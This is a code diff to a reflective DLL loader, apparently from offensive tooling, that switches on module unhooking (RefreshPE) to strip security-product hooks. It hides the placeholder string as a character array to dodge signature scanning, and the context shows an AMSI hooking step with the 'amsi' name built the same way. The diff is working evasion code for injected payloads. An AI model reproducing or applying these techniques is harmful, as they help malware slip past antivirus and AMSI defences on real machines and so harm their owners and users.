@@ -26,7 +26,16 @@
 // POSSIBILITY OF SUCH DAMAGE.
 //===============================================================================================//
 #include "ReflectiveLoader.h"
+#include "refresh.h"
 #include <amsi.h>
+
+#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
+#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
+
+// void dprintf(const char*, ...);
+#define dprintf
+
+
 
 //===============================================================================================//
 // Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
@@ -477,10 +486,12 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
         // https://gist.github.com/EvanMcBroom/f5b1bc53977865773802d795ade67273
 
         // 6.1.Modules unhooking / refreshing
-        //if (RefreshPE("THIS_VALUE_WILL_BE_REPLACED", pLoadLibraryA, pGetProcAddress))
-        //{
-        //    dprintf("ReflectiveLoader: PE refreshed.");
-        //}
+        // THIS_VALUE_WILL_BE_REPLACED
+        char buf0[] = { 'T', 'H', 'I', 'S', '_', 'V', 'A', 'L', 'U', 'E', '_', 'W', 'I', 'L', 'L', '_', 'B', 'E', '_', 'R', 'E', 'P', 'L', 'A', 'C', 'E', 'D', '\x00' };
+        if (RefreshPE(buf0, pLoadLibraryA, pGetProcAddress))
+        {
+            dprintf("ReflectiveLoader: PE refreshed.");
+        }
 
         // 6.2. AMSI hook
         const char buf2[] = {'a', 'm', 's', 'i', '\x00'};
@@ -576,7 +587,12 @@ DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader( VOID )
     // STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
     return uiValueA;
 }
+
+
 //===============================================================================================//
+
+
+
 #ifndef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
 
 BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
